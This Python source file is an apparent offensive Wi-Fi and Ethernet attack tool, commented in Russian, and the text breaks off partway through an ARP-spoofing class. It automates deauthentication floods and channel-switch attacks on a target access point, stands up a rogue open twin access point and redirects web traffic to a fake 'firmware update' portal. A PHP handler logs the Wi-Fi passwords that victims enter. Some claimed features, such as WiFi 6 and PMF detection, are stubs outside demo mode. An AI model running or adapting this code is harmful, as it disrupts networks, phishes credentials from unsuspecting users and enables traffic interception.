#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Evil Twin Attack Suite v2.1
Modern Wi-Fi & Ethernet Penetration Tool
Supports: WPA2/WPA3, WiFi 6 (802.11ax), Channel Hopping, PMF Bypass, MITM, ARP Spoofing
"""

import os
import sys
import time
import subprocess
import threading
import signal
from datetime import datetime
import json
import re
import argparse
import random
import struct
import fcntl
import socket
from collections import defaultdict
from typing import Dict, List, Optional, Tuple
import hashlib
import select

# Парсим аргументы командной строки
parser = argparse.ArgumentParser(description='Evil Twin Attack Suite v2.1')
parser.add_argument('--demo', action='store_true', help='Запустить в демо-режиме')
parser.add_argument('--aggressive', action='store_true', help='Агрессивный режим деаутентификации')
parser.add_argument('--stealth', action='store_true', help='Скрытный режим (меньше пакетов)')
parser.add_argument('--wifi6', action='store_true', help='Оптимизация для WiFi 6 целей')
args = parser.parse_args()

DEMO_MODE = args.demo
AGGRESSIVE_MODE = args.aggressive
STEALTH_MODE = args.stealth
WIFI6_MODE = args.wifi6


class Colors:
    """Цветовые схемы для терминала"""
    RESET = '\033[0m'
    RED = '\033[91m'
    WHITE = '\033[97m'
    ORANGE = '\033[38;5;208m'
    BRIGHT_ORANGE = '\033[38;5;214m'
    DARK_ORANGE = '\033[38;5;202m'
    BRIGHT_RED = '\033[1;91m'
    DARK_RED = '\033[31m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    CYAN = '\033[96m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    BOLD = '\033[1m'
    DIM = '\033[2m'
    UNDERLINE = '\033[4m'
    BG_ORANGE = '\033[48;5;208m'
    BG_DARK = '\033[48;5;236m'
    
    CLAUDE_COLORS = [
        '\033[38;5;208m',
        '\033[38;5;214m',
        '\033[38;5;223m',
        '\033[38;5;231m',
    ]
    
    @staticmethod
    def gradient(text, style='claude'):
        colors = Colors.CLAUDE_COLORS if style == 'claude' else [
            '\033[38;5;196m', '\033[38;5;202m', '\033[38;5;208m',
            '\033[38;5;214m', '\033[38;5;220m', '\033[38;5;231m',
        ]
        result = ""
        step = max(len(text) / len(colors), 1)
        for i, char in enumerate(text):
            color_idx = min(int(i / step), len(colors) - 1)
            result += colors[color_idx] + char
        return result + Colors.RESET
    
    @staticmethod
    def animate_gradient(text, frame=0):
        colors = Colors.CLAUDE_COLORS
        result = ""
        for i, char in enumerate(text):
            color_idx = (i + frame) % len(colors)
            result += colors[color_idx] + char
        return result + Colors.RESET


# ============= WiFi 6, Channel Hopping, PMF =============

class WiFi6Capabilities:
    """Определение и работа с WiFi 6 (802.11ax) возможностями"""
    
    HE_CAPABILITIES_IE = 0xff
    HE_OPERATION_IE = 0xff
    BSS_COLOR_DISABLED = 0
    BSS_COLOR_PARTIAL = 1
    BSS_COLOR_ENABLED = 2
    
    @staticmethod
    def detect_wifi6(beacon_data: bytes) -> dict:
        wifi6_info = {
            'supported': False,
            'he_capabilities': False,
            'bss_color': None,
            'ofdma': False,
            'mu_mimo': False,
            'twt': False,
            '160mhz': False,
            'spatial_streams': 0
        }
        
        if DEMO_MODE:
            wifi6_info['supported'] = random.choice([True, False])
            if wifi6_info['supported']:
                wifi6_info['he_capabilities'] = True
                wifi6_info['bss_color'] = random.randint(1, 63)
                wifi6_info['ofdma'] = True
                wifi6_info['mu_mimo'] = True
                wifi6_info['spatial_streams'] = random.choice([2, 4, 8])
            return wifi6_info
        
        return wifi6_info
    
    @staticmethod
    def get_optimal_attack_params(wifi6_info: dict) -> dict:
        params = {
            'deauth_interval': 0.1,
            'deauth_count': 5,
            'use_disassoc': True,
            'target_bss_color': None,
            'channel_width': 20
        }
        
        if wifi6_info.get('supported'):
            params['deauth_interval'] = 0.05
            params['deauth_count'] = 10
            params['use_disassoc'] = True
            
            if wifi6_info.get('bss_color'):
                params['target_bss_color'] = wifi6_info['bss_color']
            
            if wifi6_info.get('160mhz'):
                params['channel_width'] = 160
            elif wifi6_info.get('ofdma'):
                params['channel_width'] = 80
        
        return params


class ChannelHopper:
    """Отслеживание и синхронизация с channel hopping"""
    
    CHANNELS_24GHZ = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13]
    CHANNELS_5GHZ = [36, 40, 44, 48, 52, 56, 60, 64, 100, 104, 108, 112, 
                    116, 120, 124, 128, 132, 136, 140, 144, 149, 153, 157, 161, 165]
    CHANNELS_6GHZ = [1, 5, 9, 13, 17, 21, 25, 29, 33, 37, 41, 45, 49, 53,
                    57, 61, 65, 69, 73, 77, 81, 85, 89, 93]
    
    def __init__(self, interface: str, target_bssid: str, initial_channel: int):
        self.interface = interface
        self.target_bssid = target_bssid
        self.current_channel = initial_channel
        self.channel_history: List[Tuple[int, float]] = [(initial_channel, time.time())]
        self.hop_detected = False
        self.monitoring = False
        self.monitor_thread: Optional[threading.Thread] = None
        self.callbacks: List[callable] = []
        self.last_seen = time.time()
        self.hop_count = 0
        self.hop_pattern: List[int] = []
        self.predicted_next_channel: Optional[int] = None
        
        if initial_channel in self.CHANNELS_24GHZ:
            self.band = '2.4GHz'
            self.scan_channels = self.CHANNELS_24GHZ
        elif initial_channel in self.CHANNELS_5GHZ:
            self.band = '5GHz'
            self.scan_channels = self.CHANNELS_5GHZ
        else:
            self.band = '6GHz'
            self.scan_channels = self.CHANNELS_6GHZ
    
    def add_callback(self, callback: callable):
        self.callbacks.append(callback)
    
    def start_monitoring(self):
        self.monitoring = True
        self.monitor_thread = threading.Thread(target=self._monitor_loop, daemon=True)
        self.monitor_thread.start()
    
    def stop_monitoring(self):
        self.monitoring = False
        if self.monitor_thread:
            self.monitor_thread.join(timeout=2)
    
    def _monitor_loop(self):
        scan_idx = 0
        channels_since_found = 0
        
        while self.monitoring:
            if DEMO_MODE:
                time.sleep(2)
                if random.random() > 0.8:
                    new_channel = random.choice(self.scan_channels)
                    if new_channel != self.current_channel:
                        self._handle_channel_change(new_channel)
                continue
            
            channel = self.scan_channels[scan_idx]
            self._set_channel(channel)
            time.sleep(0.1)
            
            if self._check_target_on_channel(channel):
                channels_since_found = 0
                if channel != self.current_channel:
                    self._handle_channel_change(channel)
                else:
                    self.last_seen = time.time()
            else:
                channels_since_found += 1
            
            if channels_since_found > len(self.scan_channels):
                time.sleep(0.05)
            else:
                time.sleep(0.2)
            
            scan_idx = (scan_idx + 1) % len(self.scan_channels)
    
    def _set_channel(self, channel: int):
        try:
            subprocess.run(['iwconfig', self.interface, 'channel', str(channel)],
                         capture_output=True, timeout=1)
        except Exception:
            pass
    
    def _check_target_on_channel(self, channel: int) -> bool:
        try:
            result = subprocess.run(
                ['iw', 'dev', self.interface, 'scan', 'freq', 
                 str(self._channel_to_freq(channel)), 'flush'],
                capture_output=True, text=True, timeout=2)
            return self.target_bssid.lower() in result.stdout.lower()
        except Exception:
            return False
    
    def _channel_to_freq(self, channel: int) -> int:
        if channel <= 13:
            return 2407 + channel * 5
        elif channel == 14:
            return 2484
        elif channel >= 36 and channel <= 165:
            return 5000 + channel * 5
        else:
            return 5950 + channel * 5
    
    def _handle_channel_change(self, new_channel: int):
        old_channel = self.current_channel
        self.current_channel = new_channel
        self.channel_history.append((new_channel, time.time()))
        self.hop_count += 1
        self.hop_detected = True
        self.last_seen = time.time()
        
        self.hop_pattern.append(new_channel)
        if len(self.hop_pattern) > 10:
            self.hop_pattern.pop(0)
        
        self._predict_next_channel()
        
        for callback in self.callbacks:
            try:
                callback(old_channel, new_channel)
            except Exception:
                pass
    
    def _predict_next_channel(self):
        if len(self.hop_pattern) < 3:
            self.predicted_next_channel = None
            return
        
        pattern_len = 2
        while pattern_len <= len(self.hop_pattern) // 2:
            pattern = self.hop_pattern[-pattern_len:]
            for i in range(len(self.hop_pattern) - pattern_len):
                if self.hop_pattern[i:i+pattern_len] == pattern:
                    next_idx = i + pattern_len
                    if next_idx < len(self.hop_pattern):
                        self.predicted_next_channel = self.hop_pattern[next_idx]
                        return
            pattern_len += 1
        
        self.predicted_next_channel = None
    
    def get_channel_stats(self) -> dict:
        channel_counts = defaultdict(int)
        for channel, _ in self.channel_history:
            channel_counts[channel] += 1
        
        return {
            'current': self.current_channel,
            'band': self.band,
            'hop_count': self.hop_count,
            'history_size': len(self.channel_history),
            'most_used': max(channel_counts.items(), key=lambda x: x[1])[0] if channel_counts else None,
            'predicted_next': self.predicted_next_channel,
            'last_seen_ago': time.time() - self.last_seen
        }


class PMFBypass:
    """Обход Protected Management Frames (802.11w)"""
    
    MFPC = 0x80
    MFPR = 0x40
    
    @staticmethod
    def detect_pmf(beacon_data: bytes) -> dict:
        pmf_info = {
            'enabled': False,
            'required': False,
            'capable': False,
            'cipher_suite': None
        }
        
        if DEMO_MODE:
            pmf_info['enabled'] = random.choice([True, False])
            pmf_info['required'] = pmf_info['enabled'] and random.choice([True, False])
            pmf_info['capable'] = True
            return pmf_info
        
        return pmf_info
    
    @staticmethod
    def get_bypass_strategy(pmf_info: dict) -> dict:
        strategy = {
            'method': 'standard_deauth',
            'success_probability': 'high',
            'notes': []
        }
        
        if not pmf_info.get('enabled'):
            return strategy
        
        if pmf_info.get('required'):
            strategy['method'] = 'channel_switch_attack'
            strategy['success_probability'] = 'medium'
            strategy['notes'].append('PMF required - using CSA attack')
        else:
            strategy['method'] = 'mixed_attack'
            strategy['success_probability'] = 'medium-high'
            strategy['notes'].append('PMF optional - some clients vulnerable')
        
        return strategy


class SmartDeauth:
    """Умная адаптивная деаутентификация"""
    
    REASON_UNSPECIFIED = 1
    REASON_DEAUTH_LEAVING = 3
    REASON_DISASSOC_INACTIVITY = 4
    REASON_CLASS2_FRAME_FROM_NONAUTH = 6
    
    def __init__(self, interface: str, target_bssid: str, 
                 channel_hopper: ChannelHopper,
                 wifi6_info: dict = None,
                 pmf_info: dict = None):
        self.interface = interface
        self.target_bssid = target_bssid
        self.channel_hopper = channel_hopper
        self.wifi6_info = wifi6_info or {}
        self.pmf_info = pmf_info or {}
        
        self.running = False
        self.thread: Optional[threading.Thread] = None
        self.clients: Dict[str, dict] = {}
        self.deauth_stats = {'sent': 0, 'successful': 0, 'clients_disconnected': 0}
        
        self.base_interval = 0.1
        self.current_interval = 0.1
        self.burst_count = 5
        self.reason_rotation = True
        self.use_disassoc = True
        
        if wifi6_info and wifi6_info.get('supported'):
            params = WiFi6Capabilities.get_optimal_attack_params(wifi6_info)
            self.base_interval = params['deauth_interval']
            self.burst_count = params['deauth_count']
        
        self.bypass_strategy = PMFBypass.get_bypass_strategy(pmf_info or {})
    
    def start(self):
        self.running = True
        self.thread = threading.Thread(target=self._deauth_loop, daemon=True)
        self.thread.start()
    
    def stop(self):
        self.running = False
        if self.thread:
            self.thread.join(timeout=2)
    
    def add_client(self, client_mac: str, info: dict = None):
        self.clients[client_mac.upper()] = info or {
            'first_seen': time.time(),
            'deauth_count': 0,
            'last_deauth': None
        }
    
    def _deauth_loop(self):
        reason_codes = [
            self.REASON_DEAUTH_LEAVING,
            self.REASON_UNSPECIFIED,
            self.REASON_CLASS2_FRAME_FROM_NONAUTH,
            self.REASON_DISASSOC_INACTIVITY,
        ]
        reason_idx = 0
        
        while self.running:
            try:
                if self.reason_rotation:
                    reason = reason_codes[reason_idx]
                    reason_idx = (reason_idx + 1) % len(reason_codes)
                else:
                    reason = self.REASON_DEAUTH_LEAVING
                
                if self.bypass_strategy['method'] == 'channel_switch_attack':
                    self._send_csa_attack()
                elif self.bypass_strategy['method'] == 'mixed_attack':
                    if random.random() > 0.5:
                        self._send_csa_attack()
                    else:
                        self._send_deauth_burst(reason)
                else:
                    self._send_deauth_burst(reason)
                
                if self.channel_hopper.hop_detected:
                    self.current_interval = self.base_interval * 0.5
                    self.channel_hopper.hop_detected = False
                else:
                    self.current_interval = min(self.current_interval * 1.1, self.base_interval * 2)
                
                time.sleep(self.current_interval)
                
            except Exception:
                time.sleep(0.5)
    
    def _send_deauth_burst(self, reason: int):
        if DEMO_MODE:
            self.deauth_stats['sent'] += self.burst_count
            return
        
        for _ in range(self.burst_count):
            try:
                subprocess.run(['aireplay-ng', '--deauth', '1', '-a', self.target_bssid,
                              self.interface], capture_output=True, timeout=1)
                self.deauth_stats['sent'] += 1
            except Exception:
                pass
        
        for client_mac in list(self.clients.keys()):
            for _ in range(self.burst_count // 2):
                try:
                    subprocess.run(['aireplay-ng', '--deauth', '1', '-a', self.target_bssid,
                                  '-c', client_mac, self.interface],
                                 capture_output=True, timeout=1)
                    self.deauth_stats['sent'] += 1
                except Exception:
                    pass
    
    def _send_csa_attack(self):
        if DEMO_MODE:
            self.deauth_stats['sent'] += 1
            return
        
        current_channel = self.channel_hopper.current_channel
        if current_channel in ChannelHopper.CHANNELS_24GHZ:
            new_channel = random.choice([c for c in ChannelHopper.CHANNELS_24GHZ if c != current_channel])
        else:
            new_channel = random.choice([c for c in ChannelHopper.CHANNELS_5GHZ if c != current_channel])
        
        try:
            subprocess.run(['mdk4', self.interface, 'd', '-B', self.target_bssid,
                          '-c', str(current_channel), '-E', str(new_channel)],
                         capture_output=True, timeout=1)
            self.deauth_stats['sent'] += 1
        except Exception:
            pass


class ClientTracker:
    """Отслеживание клиентов целевой сети"""
    
    def __init__(self, interface: str, target_bssid: str, channel_hopper: ChannelHopper):
        self.interface = interface
        self.target_bssid = target_bssid
        self.channel_hopper = channel_hopper
        self.clients: Dict[str, dict] = {}
        self.running = False
        self.thread: Optional[threading.Thread] = None
        self.callbacks: List[callable] = []
    
    def add_callback(self, callback: callable):
        self.callbacks.append(callback)
    
    def start(self):
        self.running = True
        self.thread = threading.Thread(target=self._track_loop, daemon=True)
        self.thread.start()
    
    def stop(self):
        self.running = False
        if self.thread:
            self.thread.join(timeout=2)
    
    def _track_loop(self):
        while self.running:
            if DEMO_MODE:
                time.sleep(3)
                if random.random() > 0.6:
                    fake_mac = ':'.join([f'{random.randint(0, 255):02X}' for _ in range(6)])
                    self._handle_new_client(fake_mac, {
                        'signal': random.randint(-80, -30),
                        'packets': random.randint(10, 1000)
                    })
                continue
            time.sleep(3)
    
    def _handle_new_client(self, mac: str, info: dict):
        self.clients[mac] = {
            'mac': mac,
            'first_seen': time.time(),
            'last_seen': time.time(),
            **info
        }
        
        for callback in self.callbacks:
            try:
                callback(mac, self.clients[mac])
            except Exception:
                pass


class ModernEvilTwin:
    """Современная Evil Twin атака"""
    
    def __init__(self, ap_interface: str, deauth_interface: str, target: dict):
        self.ap_interface = ap_interface
        self.deauth_interface = deauth_interface
        self.target = target
        
        self.channel_hopper = ChannelHopper(
            deauth_interface,
            target['bssid'],
            int(target['channel'])
        )
        
        self.wifi6_info = WiFi6Capabilities.detect_wifi6(b'')
        self.pmf_info = PMFBypass.detect_pmf(b'')
        
        self.smart_deauth = SmartDeauth(
            deauth_interface,
            target['bssid'],
            self.channel_hopper,
            self.wifi6_info,
            self.pmf_info
        )
        
        self.client_tracker = ClientTracker(
            deauth_interface,
            target['bssid'],
            self.channel_hopper
        )
        
        self.deauth_log: List[str] = []
        self.ap_log: List[str] = []
        self.captured_passwords: List[str] = []
        
        self.running = False
        self.attack_successful = False
        self.correct_password: Optional[str] = None
        
        self.stats = {
            'channel_hops': 0,
            'clients_seen': 0,
            'deauth_sent': 0,
            'passwords_captured': 0
        }
    
    def log_deauth(self, message: str):
        timestamp = datetime.now().strftime('%H:%M:%S')
        entry = f"[{timestamp}] {message}"
        self.deauth_log.append(entry)
        if len(self.deauth_log) > 100:
            self.deauth_log.pop(0)
    
    def log_ap(self, message: str):
        timestamp = datetime.now().strftime('%H:%M:%S')
        entry = f"[{timestamp}] {message}"
        self.ap_log.append(entry)
        if len(self.ap_log) > 100:
            self.ap_log.pop(0)
    
    def setup(self):
        self.log_ap("Initializing Modern Evil Twin...")
        self.log_ap(f"Target: {self.target['ssid']}")
        self.log_ap(f"BSSID: {self.target['bssid']}")
        self.log_ap(f"Channel: {self.target['channel']}")
        
        if self.wifi6_info.get('supported'):
            self.log_ap("[!] WiFi 6 (802.11ax) detected")
        
        if self.pmf_info.get('required'):
            self.log_ap("[!] PMF Required - using advanced bypass")
        
        self._create_portal()
        self._setup_ap()
        self._start_services()
    
    def _create_portal(self):
        self.log_ap("Creating captive portal...")
        if DEMO_MODE:
            return
        
        portal_html = self._generate_adaptive_portal()
        os.makedirs('/tmp/portal', exist_ok=True)
        with open('/tmp/portal/index.html', 'w') as f:
            f.write(portal_html)
        
        php_handler = """<?php
$password = $_POST['password'] ?? '';
$ip = $_SERVER['REMOTE_ADDR'];
$time = date('Y-m-d H:i:s');
$log_file = '/tmp/evil_twin_passwords.txt';
file_put_contents($log_file, json_encode(['time'=>$time,'ip'=>$ip,'password'=>$password])."\\n", FILE_APPEND);
header('Location: https://www.google.com');
?>"""
        with open('/tmp/portal/verify.php', 'w') as f:
            f.write(php_handler)
    
    def _generate_adaptive_portal(self) -> str:
        oui = self.target['bssid'][:8].upper().replace(':', '')
        primary_color = '#667eea'
        secondary_color = '#764ba2'
        
        return f"""<!DOCTYPE html>
<html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>{self.target['ssid']} - Security Update</title>
<style>
*{{margin:0;padding:0;box-sizing:border-box}}
body{{font-family:-apple-system,sans-serif;background:linear-gradient(135deg,{primary_color},{secondary_color});
min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}}
.container{{background:white;border-radius:20px;padding:40px;max-width:420px;width:100%;box-shadow:0 25px 80px rgba(0,0,0,0.35)}}
.logo{{text-align:center;margin-bottom:25px;font-size:48px}}
h1{{color:#333;font-size:22px;margin-bottom:8px;text-align:center}}
.warning{{background:#fff3cd;border-left:4px solid #ffc107;padding:15px;margin:25px 0;border-radius:8px;font-size:14px;color:#856404}}
input[type="password"]{{width:100%;padding:14px;border:2px solid #e0e0e0;border-radius:10px;font-size:16px;margin:10px 0}}
button{{width:100%;padding:14px;background:linear-gradient(135deg,{primary_color},{secondary_color});
color:white;border:none;border-radius:10px;font-size:16px;font-weight:600;cursor:pointer}}
</style></head><body>
<div class="container">
<div class="logo">🔐</div>
<h1>Security Verification Required</h1>
<div class="warning"><strong>⚠️ Firmware Update</strong><br>Please enter your Wi-Fi password to continue.</div>
<form action="verify.php" method="POST">
<input type="password" name="password" required placeholder="Enter network password" minlength="8">
<button type="submit">Verify & Continue</button>
</form></div></body></html>"""
    
    def _setup_ap(self):
        self.log_ap("Configuring Evil Twin AP...")
        if DEMO_MODE:
            return
        
        channel = int(self.target['channel'])
        hw_mode = 'g' if channel <= 13 else 'a'
        
        hostapd_conf = f"""interface={self.ap_interface}
driver=nl80211
ssid={self.target['ssid']}
hw_mode={hw_mode}
channel={channel}
wmm_enabled=1
macaddr_acl=0
auth_algs=1
wpa=0
"""
        with open('/tmp/hostapd.conf', 'w') as f:
            f.write(hostapd_conf)
        
        dnsmasq_conf = f"""interface={self.ap_interface}
dhcp-range=10.0.0.10,10.0.0.250,255.255.255.0,24h
dhcp-option=3,10.0.0.1
dhcp-option=6,10.0.0.1
address=/#/10.0.0.1
"""
        with open('/tmp/dnsmasq.conf', 'w') as f:
            f.write(dnsmasq_conf)
        
        subprocess.run(['ip', 'link', 'set', self.ap_interface, 'down'], capture_output=True)
        subprocess.run(['ip', 'addr', 'flush', 'dev', self.ap_interface], capture_output=True)
        subprocess.run(['ip', 'addr', 'add', '10.0.0.1/24', 'dev', self.ap_interface], capture_output=True)
        subprocess.run(['ip', 'link', 'set', self.ap_interface, 'up'], capture_output=True)
        
        subprocess.run(['sysctl', '-w', 'net.ipv4.ip_forward=1'], capture_output=True)
        subprocess.run(['iptables', '-F'], capture_output=True)
        subprocess.run(['iptables', '-t', 'nat', '-F'], capture_output=True)
        subprocess.run(['iptables', '-t', 'nat', '-A', 'PREROUTING', '-p', 'tcp',
                       '--dport', '80', '-j', 'DNAT', '--to-destination', '10.0.0.1:80'], capture_output=True)
        subprocess.run(['iptables', '-t', 'nat', '-A', 'PREROUTING', '-p', 'tcp',
                       '--dport', '443', '-j', 'DNAT', '--to-destination', '10.0.0.1:80'], capture_output=True)
        subprocess.run(['iptables', '-t', 'nat', '-A', 'POSTROUTING', '-j', 'MASQUERADE'], capture_output=True)
    
    def _start_services(self):
        self.log_ap("Starting services...")
        if DEMO_MODE:
            return
        
        subprocess.run(['systemctl', 'start', 'apache2'], capture_output=True)
        subprocess.run(['cp', '-r', '/tmp/portal/', '/var/www/html/'], capture_output=True)
        subprocess.Popen(['dnsmasq', '-C', '/tmp/dnsmasq.conf', '-d'],
                        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        subprocess.Popen(['hostapd', '/tmp/hostapd.conf'],
                        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        time.sleep(2)
        self.log_ap("Services started")
    
    def start_attack(self):
        self.running = True
        
        def on_channel_change(old_ch, new_ch):
            self.log_deauth(f"Channel hop: {old_ch} -> {new_ch}")
            self.stats['channel_hops'] += 1
        
        def on_new_client(mac, info):
            self.log_deauth(f"New client: {mac}")
            self.smart_deauth.add_client(mac, info)
            self.stats['clients_seen'] += 1
        
        self.channel_hopper.add_callback(on_channel_change)
        self.client_tracker.add_callback(on_new_client)
        
        self.log_deauth("Starting channel monitor...")
        self.channel_hopper.start_monitoring()
        
        self.log_deauth("Starting client tracker...")
        self.client_tracker.start()
        
        self.log_deauth("Starting smart deauth...")
        self.smart_deauth.start()
        
        self._start_password_monitor()
    
    def _start_password_monitor(self):
        def monitor():
            while self.running and not self.attack_successful:
                if DEMO_MODE:
                    time.sleep(random.randint(5, 15))
                    if not self.running:
                        break
                    
                    password = random.choice(['Password123!', 'WiFi2024', 'HomeNetwork99'])
                    ip = f"10.0.0.{random.randint(10, 200)}"
                    
                    self.log_ap(f"Client connected: {ip}")
                    self.log_ap(f"Password received: {password}")
                    self.captured_passwords.append(f"{ip}: {password}")
                    self.stats['passwords_captured'] += 1
                    
                    if len(self.captured_passwords) >= 3 or random.random() > 0.7:
                        self.log_ap(f"[SUCCESS] Password verified: {password}")
                        self.correct_password = password
                        self.attack_successful = True
                        break
                    else:
                        self.log_ap("Password incorrect, continuing...")
                    continue
                
                try:
                    pwd_file = '/tmp/evil_twin_passwords.txt'
                    if os.path.exists(pwd_file):
                        with open(pwd_file, 'r') as f:
                            lines = f.readlines()
                        
                        for line in lines[len(self.captured_passwords):]:
                            try:
                                data = json.loads(line.strip())
                                password = data.get('password', '')
                                ip = data.get('ip', 'unknown')
                                
                                self.log_ap(f"Client: {ip}")
                                self.log_ap(f"Password: {password}")
                                self.captured_passwords.append(f"{ip}: {password}")
                                self.stats['passwords_captured'] += 1
                            except:
                                pass
                except:
                    pass
                
                time.sleep(1)
        
        thread = threading.Thread(target=monitor, daemon=True)
        thread.start()
    
    def stop_attack(self):
        self.running = False
        self.log_ap("Stopping attack...")
        self.smart_deauth.stop()
        self.client_tracker.stop()
        self.channel_hopper.stop_monitoring()
        
        if not DEMO_MODE:
            subprocess.run(['killall', 'hostapd'], capture_output=True)
            subprocess.run(['killall', 'dnsmasq'], capture_output=True)
            subprocess.run(['iptables', '-F'], capture_output=True)
            subprocess.run(['iptables', '-t', 'nat', '-F'], capture_output=True)
    
    def get_stats(self) -> dict:
        return {
            **self.stats,
            'deauth_sent': self.smart_deauth.deauth_stats['sent'],
            'current_channel': self.channel_hopper.current_channel,
            'band': self.channel_hopper.band,
            'predicted_channel': self.channel_hopper.predicted_next_channel,
            'wifi6_target': self.wifi6_info.get('supported', False),
            'pmf_enabled': self.pmf_info.get('enabled', False),
            'bypass_method': self.smart_deauth.bypass_strategy['method']
        }


# ============= ETHERNET / MITM КЛАССЫ =============

class EthernetInterface:
    """Управление Ethernet интерфейсами"""
    
    @staticmethod
    def get_interfaces() -> List[dict]:
        """Получить список Ethernet интерфейсов"""
        if DEMO_MODE:
            return [
                {'name': 'eth0', 'ip': '192.168.1.100', 'mac': 'AA:BB:CC:DD:EE:01', 'status': 'UP'},
                {'name': 'enp0s3', 'ip': '10.0.2.15', 'mac': 'AA:BB:CC:DD:EE:02', 'status': 'UP'},
            ]
        
        interfaces = []
        try:
            result = subprocess.run(['ip', '-o', 'link', 'show'], capture_output=True, text=True, timeout=5)
            
            for line in result.stdout.split('\n'):
                if not line.strip():
                    continue
                
                parts = line.split(':')
                if len(parts) >= 2:
                    iface_name = parts[1].strip().split('@')[0]
                    
                    if iface_name == 'lo' or iface_name.startswith('wl') or iface_name.startswith('wlan'):
                        continue
                    
                    ip_result = subprocess.run(['ip', '-4', 'addr', 'show', iface_name],
                                             capture_output=True, text=True, timeout=2)
                    ip_match = re.search(r'inet (\d+\.\d+\.\d+\.\d+)', ip_result.stdout)
                    ip = ip_match.group(1) if ip_match else 'No IP'
                    
                    mac_match = re.search(r'link/ether ([0-9a-f:]+)', line, re.IGNORECASE)
                    mac = mac_match.group(1).upper() if mac_match else 'Unknown'
                    
                    status = 'UP' if 'UP' in line else 'DOWN'
                    
                    interfaces.append({
                        'name': iface_name,
                        'ip': ip,
                        'mac': mac,
                        'status': status
                    })
        except Exception:
            pass
        
        return interfaces
    
    @staticmethod
    def get_gateway(interface: str) -> Optional[str]:
        """Получить gateway для интерфейса"""
        if DEMO_MODE:
            return '192.168.1.1'
        
        try:
            result = subprocess.run(['ip', 'route', 'show', 'dev', interface],
                                  capture_output=True, text=True, timeout=5)
            match = re.search(r'default via (\d+\.\d+\.\d+\.\d+)', result.stdout)
            if match:
                return match.group(1)
        except Exception:
            pass
        
        return None


class NetworkScanner:
    """Сканер сети для обнаружения клиентов"""
    
    def __init__(self, interface: str):
        self.interface = interface
        self.clients: List[dict] = []
        self.running = False
    
    def scan(self) -> List[dict]:
        """Сканирование сети"""
        if DEMO_MODE:
            return self._demo_scan()
        
        self.running = True
        self.clients = []
        
        try:
            result = subprocess.run(['ip', '-4', 'addr', 'show', self.interface],
                                  capture_output=True, text=True)
            match = re.search(r'inet (\d+\.\d+\.\d+)\.\d+/(\d+)', result.stdout)
            
            if not match:
                return []
            
            subnet = f"{match.group(1)}.0/{match.group(2)}"
            
            try:
                result = subprocess.run(['arp-scan', '-I', self.interface, '--localnet'],
                                      capture_output=True, text=True, timeout=30)
                
                for line in result.stdout.split('\n'):
                    match = re.match(r'(\d+\.\d+\.\d+\.\d+)\s+([0-9a-f:]+)\s+(.*)', line, re.IGNORECASE)
                    if match:
                        self.clients.append({
                            'ip': match.group(1),
                            'mac': match.group(2).upper(),
                            'vendor': match.group(3).strip()
                        })
            except FileNotFoundError:
                result = subprocess.run(['nmap', '-sn', subnet],
                                      capture_output=True, text=True, timeout=60)
                
                current_ip = None
                for line in result.stdout.split('\n'):
                    ip_match = re.search(r'Nmap scan report for .* \((\d+\.\d+\.\d+\.\d+)\)', line)
                    if ip_match:
                        current_ip = ip_match.group(1)
                    
                    mac_match = re.search(r'MAC Address: ([0-9A-F:]+) \((.*?)\)', line)
                    if mac_match and current_ip:
                        self.clients.append({
                            'ip': current_ip,
                            'mac': mac_match.group(1),
                            'vendor': mac_match.group(2)
                        })
                        current_ip = None
                        
        except Exception:
            pass
        
        self.running = False
        return self.clients
    
    def _demo_scan(self) -> List[dict]:
        """Демо сканирование"""
        self.running = True
        
        fake_clients = [
            {'ip': '192.168.1.1', 'mac': 'AA:BB:CC:00:00:01', 'vendor': 'Cisco Router'},
            {'ip': '192.168.1.100', 'mac': 'AA:BB:CC:00:00:02', 'vendor': 'Apple iPhone'},
            {'ip': '192.168.1.101', 'mac': 'AA:BB:CC:00:00:03', 'vendor': 'Samsung Galaxy'},
            {'ip': '192.168.1.102', 'mac': 'AA:BB:CC:00:00:04', 'vendor': 'Dell Laptop'},
            {'ip': '192.168.1.103', 'mac': 'AA:BB:CC:00:00:05', 'vendor': 'HP Printer'},
            {'ip': '192.168.1.150', 'mac': 'AA:BB:CC:00:00:06', 'vendor': 'Smart TV'},
        ]
        
        time.sleep(2)
        self.clients = fake_clients
        self.running = False
        return self.clients


class MITMAttack:
    """Man-in-the-Middle атака через ARP Spoofing"""
    
    def __init__(self, interface: str, target_ip: str, gateway_ip: str):
        self.interface = interface
        self.target_ip = target_ip
        self.gateway_ip = gateway_ip
        
        self.running = False
        self.arpspoof_target: Optional[subprocess.Popen] = None
        self.arpspoof_gateway: Optional[subprocess.Popen] = None
        
        self.http_downgrade = False
        self.logging_mode: Optional[str] = None
        self.log_file: Optional[str] = None
        
        self.left_log: List[str] = []
        self.captured_data: List[dict] = []
        
        self.sslstrip_proc: Optional[subprocess.Popen] = None
        self.traffic_thread: Optional[threading.Thread] = None
        self.intercepting = False
    
    def log(self, message: str):
        """Добавить запись в лог"""
        timestamp = datetime.now().strftime('%H:%M:%S')
        entry = f"[{timestamp}] {message}"
        self.left_log.append(entry)
        if len(self.left_log) > 100:
            self.left_log.pop(0)
    
    def enable_ip_forwarding(self):
        """Включить IP forwarding"""
        if DEMO_MODE:
            self.log("Enabling IP forwarding...")
            time.sleep(0.3)
            self.log("IP forwarding enabled")
            return
        
        try:
            subprocess.run(['sysctl', '-w', 'net.ipv4.ip_forward=1'], capture_output=True)
            self.log("IP forwarding enabled")
        except Exception as e:
            self.log(f"Error enabling IP forwarding: {e}")
    
    def disable_ip_forwarding(self):
        """Выключить IP forwarding"""
        if DEMO_MODE:
            return
        
        try:
            subprocess.run(['sysctl', '-w', 'net.ipv4.ip_forward=0'], capture_output=True)
        except Exception:
            pass
    
    def start(self):
        """Запуск MITM атаки (только ARP spoofing)"""
        self.running = True
        
        self.log("=" * 40)
        self.log("Starting MITM Attack")
        self.log("=" * 40)
        self.log(f"Interface: {self.interface}")
        self.log(f"Target: {self.target_ip}")
        self.log(f"Gateway: {self.gateway_ip}")
        self.log("")
        
        self.enable_ip_forwarding()
        self.log("")
        
        self.log("Starting ARP spoofing...")
        
        if DEMO_MODE:
